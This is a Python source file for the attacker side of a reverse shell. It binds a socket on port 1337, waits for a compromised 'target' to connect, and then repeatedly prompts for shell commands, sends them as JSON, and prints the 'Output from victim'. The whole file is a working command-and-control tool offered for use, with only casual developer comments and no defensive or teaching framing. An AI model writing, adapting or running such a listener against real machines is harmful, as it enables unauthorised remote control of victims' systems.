import socket, sys, json, argparse, subprocess
from sys import getsizeof
from itertools import cycle
import multiprocessing, time

class Args:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address.')
        parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port.')
        parser.set_defaults(ip = self.get_ip())
        parser.set_defaults(port = 1337)
        options = parser.parse_args()
        self.ip = options.ip
        self.port = options.port
        
    
    def get_ip(self):
        pipecmd_ip = "/sbin/ip route | awk '/src/ { printf $9 }'"
        ip = subprocess.check_output(pipecmd_ip,shell=True)
        ip_decoded = ip.decode('utf-8')
        self.ip = ip_decoded
        return self.ip


class Listener:
    
    
    def __init__(self,ip,port):
        spinner = multiprocessing.Process(target=self.spinner)
        #self.byteTotal = 0
        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.listener.bind((str(ip),port)) #bind to this machine! 127.0.0.1 might work to? 
        self.listener.listen(0)
        print('Starting listener on address {} and port {}.\nWaiting for connection...'.format(ip,port)) #add a threading spinner here
        spinner.start()
        try:
            self.connection,address = self.listener.accept() #address is tuple with address and port
        except KeyboardInterrupt:
            spinner.terminate()
            print('\nSIGINT caught, exiting...')
            sys.exit()
        #print(connection) #connection is the socket object with information about local address and remote address
        spinner.terminate()
        print('Connection established with ' + str(address[0]) + ' on port ' + str(address[1]))
        print('Enter \'bye\' to close connection')
    
    
    def sendStream(self,data):
        jsData = json.dumps(data)
        self.connection.send(str(jsData).encode('utf-8'))
    
    
    def spinner(self):
        spinnerChars = ['-', '/', '|', '\\']
        while True:
            for char in cycle(spinnerChars):
                print(char,end='\r')
                time.sleep(.2)

    
    def recvStream(self):
        jsData = ''
        #print(getsizeof(jsData))
        while True:
            try:
                recvData = self.connection.recv(1024)
                recvData = recvData.decode()
                #print(getsizeof(jsData))
                #byteSize = getsizeof(jsData)
                #self.byteTotal += byteSize
                jsData = jsData + recvData
                return json.loads(jsData)
            except Exception as e:
                #print(e)
                continue
                
    def utf8len(self,string):
        return len(string.encode('utf-8'))


    def executeCmd(self,cmd):
        #cmd = str(cmd).encode('utf-8')
        #print('executeCmd')
        #print(cmd)
        self.sendStream(cmd)
        #result = self.connection.recv(1024)
        #result = result.decode()
        return self.recvStream() #calling.executeCmd will return the result of the command sent by run()


    def run(self): #so my run() function will need to do the exit call logic, execCmd just needs to send and receive the command from run
        while True:
            inputChecker = False
            while inputChecker == False:
                cmd = input('Enter command to execute on target:')
                if cmd == '':
                    print('Command must not be blank')
                else:
                    inputChecker = True
            if cmd != 'bye':
                result = self.executeCmd(cmd)
                print('Output from victim, {} bytes long'.format(self.utf8len(result)))
                print('#'*100)
                print(result)
                print('#'*100)
            else:
                print('Exit call received, closing connection')
                self.listener.close()
                sys.exit() 
          


try:
    args = Args()
    listener = Listener(args.ip,args.port)
    listener.run()
except KeyboardInterrupt:
    print('Interrupt caught, exiting...')
    sys.exit()


